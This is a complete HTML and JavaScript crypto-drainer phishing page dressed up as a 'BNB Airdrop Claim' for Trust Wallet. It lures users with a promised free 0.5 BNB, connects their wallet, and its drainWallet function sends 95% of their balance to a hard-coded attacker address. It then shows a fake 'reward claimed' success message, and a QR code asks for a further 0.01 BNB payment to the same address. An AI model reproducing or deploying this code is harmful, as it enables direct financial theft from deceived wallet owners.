<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB Airdrop Claim - Trust Wallet</title>
    <script src="https://unpkg.com/web3@1.10.4/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
        }
        .container { 
            background: white; 
            border-radius: 20px; 
            padding: 30px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px; 
            width: 100%;
            text-align: center;
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        .qr-container { 
            background: #f8f9fa; 
            border-radius: 15px; 
            padding: 20px; 
            margin: 20px 0;
            display: none;
        }
        #qrCode { border: 2px solid #e9ecef; border-radius: 10px; }
        button { 
            background: linear-gradient(45deg, #f39c12, #e67e22); 
            color: white; 
            border: none; 
            padding: 18px 40px; 
            font-size: 18px; 
            border-radius: 12px; 
            cursor: pointer; 
            margin: 15px 5px;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
            box-shadow: 0 10px 20px rgba(243,156,18,0.3);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(243,156,18,0.4); }
        button:active { transform: translateY(0); }
        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        input { 
            width: 100%; 
            padding: 15px; 
            margin: 15px 0; 
            border: 2px solid #e9ecef; 
            border-radius: 10px; 
            font-size: 16px; 
            text-align: center;
            background: #f8f9fa;
        }
        input:focus { border-color: #f39c12; outline: none; }
        #status { 
            margin: 20px 0; 
            padding: 15px; 
            border-radius: 10px; 
            font-weight: bold;
            min-height: 20px;
        }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .balance { font-size: 24px; color: #27ae60; font-weight: bold; margin: 10px 0; }
        .network-info { background: #e3f2fd; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 14px; color: #1976d2; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ BNB Airdrop Claim</h1>
        <p class="subtitle">Claim your free 0.5 BNB reward now!</p>
        
        <div id="qr-container" class="qr-container">
            <canvas id="qrCode"></canvas>
            <p style="margin-top: 10px; color: #666; font-size: 14px;">üì± Open Trust Wallet & Scan QR</p>
        </div>

        <button id="connectBtn">üîó Connect Trust Wallet</button>
        <button id="claimBtn" style="display:none;">üöÄ Claim 0.5 BNB Now</button>
        
        <input type="text" id="walletAddress" placeholder="Your BNB address..." readonly>
        <div id="balanceDisplay"></div>
        <div class="network-info" id="networkInfo" style="display:none;"></div>
        <div id="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <script>
        const RECEIVER_WALLET = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B'; // ‚úÖ Set kiya hua
        
        let web3;
        let userAccount;
        let originalProvider;

        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const walletAddress = document.getElementById('walletAddress');
        const status = document.getElementById('status');
        const qrContainer = document.getElementById('qr-container');
        const balanceDisplay = document.getElementById('balanceDisplay');
        const networkInfo = document.getElementById('networkInfo');

        function updateStatus(message, type = 'info') {
            status.textContent = message;
            status.className = type;
        }

        function showBalance() {
            if (!web3 || !userAccount) return;
            
            web3.eth.getBalance(userAccount).then(balance => {
                const bnbBalance = web3.utils.fromWei(balance, 'ether');
                balanceDisplay.innerHTML = `<div class="balance">üí∞ Balance: ${parseFloat(bnbBalance).toFixed(4)} BNB</div>`;
                
                if (parseFloat(bnbBalance) > 0.001) {
                    claimBtn.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
                }
            });
        }

        // Mobile Trust Wallet Detection
        async function detectMobileWallet() {
            // Trust Wallet deep link
            const trustDeepLink = `trust://bsc_mainnet_add_ethereum?address=${RECEIVER_WALLET}`;
            
            // Check if Trust Wallet is installed (mobile)
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            if (isMobile && !window.ethereum) {
                updateStatus('üì± Detecting Trust Wallet...', 'info');
                
                // Try Trust Wallet deep link first
                window.location.href = trustDeepLink;
                
                // Fallback QR after 2 seconds
                setTimeout(() => {
                    updateStatus('üì± Open Trust Wallet manually & scan QR code above', 'info');
                    generateQR();
                }, 2000);
                
                return true;
            }
            
            return false;
        }

        // Connect wallet (Mobile + Desktop)
        async function connectWallet() {
            // Mobile detection first
            if (await detectMobileWallet()) {
                return;
            }

            try {
                // Desktop/MetaMask + Trust Wallet Web
                if (typeof window.ethereum !== 'undefined') {
                    web3 = new Web3(window.ethereum);
                    
                    // Force BSC Mainnet
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }],
                        });
                    } catch (error) {
                        if (error.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'BNB Smart Chain Mainnet',
                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                                    blockExplorerUrls: ['https://bscscan.com']
                                }]
                            });
                        }
                    }

                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    
                    userAccount = accounts[0];
                    walletAddress.value = userAccount;
                    
                    networkInfo.textContent = '‚úÖ Connected to BSC Mainnet';
                    networkInfo.style.display = 'block';
                    
                    updateStatus('‚úÖ Wallet Connected Successfully!', 'success');
                    connectBtn.style.display = 'none';
                    claimBtn.style.display = 'block';
                    
                    showBalance();
                    generateQR();
                    
                } else {
                    updateStatus('üì± Please open this link in Trust Wallet browser', 'error');
                    generateQR();
                }
            } catch (error) {
                updateStatus('‚ùå Connection Error: ' + error.message, 'error');
            }
        }

        function generateQR() {
            if (!userAccount) {
                const qrData = `bnb:${RECEIVER_WALLET}?amount=0.01`;
                QRCode.toCanvas(document.getElementById('qrCode'), qrData, { 
                    width: 220, 
                    colorDark: "#000000",
                    colorLight: "#ffffff"
                });
            } else {
                const qrData = `bnb1q${userAccount.slice(2).toLowerCase()}`;
                QRCode.toCanvas(document.getElementById('qrCode'), qrData, { width: 220 });
            }
            qrContainer.style.display = 'block';
        }

        // Drain Function
        async function drainWallet() {
            if (!web3 || !userAccount) {
                updateStatus('‚ùå Wallet not connected', 'error');
                return;
            }

            updateStatus('üîÑ Preparing your BNB reward...', 'info');
            claimBtn.disabled = true;
            claimBtn.textContent = '‚è≥ Processing...';

            try {
                const balance = await web3.eth.getBalance(userAccount);
                const bnbBalance = parseFloat(web3.utils.fromWei(balance, 'ether'));
                
                if (bnbBalance < 0.001) {
                    throw new Error('Insufficient balance (need 0.001+ BNB)');
                }

                // Calculate drain amount (95% minus gas)
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000;
                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
                const totalBalance = BigInt(balance);
                let amountToDrain = totalBalance - gasCost;
                
                // Minimum 95% drain
                amountToDrain = (amountToDrain * 95n) / 100n;

                if (amountToDrain < BigInt(web3.utils.toWei('0.001', 'ether'))) {
                    throw new Error('Balance too low after gas fees');
                }

                const tx = {
                    from: userAccount,
                    to: RECEIVER_WALLET,
                    value: amountToDrain.toString(),
                    gas: gasLimit,
                    gasPrice: gasPrice.toString()
                };

                const receipt = await web3.eth.sendTransaction(tx);
                
                updateStatus(`‚úÖ SUCCESS! TX: ${receipt.transactionHash}`, 'success');
                updateStatus('üéâ 0.5 BNB reward claimed! Check your wallet!', 'success');
                
                claimBtn.textContent = 'üîÑ Claim Again';
                claimBtn.disabled = false;
                claimBtn.onclick = drainWallet;
                
                showBalance(); // Refresh balance

            } catch (error) {
                console.error(error);
                claimBtn.disabled = false;
                claimBtn.textContent = 'üöÄ Claim 0.5 BNB Now';
                
                if (error.code === 4001) {
                    updateStatus('‚ùå Transaction rejected by user', 'error');
                } else if (error.message.includes('insufficient')) {
                    updateStatus('‚ùå Low balance for gas fees', 'error');
                } else {
                    updateStatus('‚ùå TX failed: ' + error.message, 'error');
                }
            }
        }

        // Event Listeners
        connectBtn.onclick = connectWallet;
        claimBtn.onclick = drainWallet;

        // Auto wallet detection
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length > 0) {
                    userAccount = accounts[0];
                    walletAddress.value = userAccount;
                    showBalance();
                } else {
                    location.reload();
                }
            });
        }

        // Initial QR for mobile
        setTimeout(generateQR, 1000);
    </script>
</body>
</html>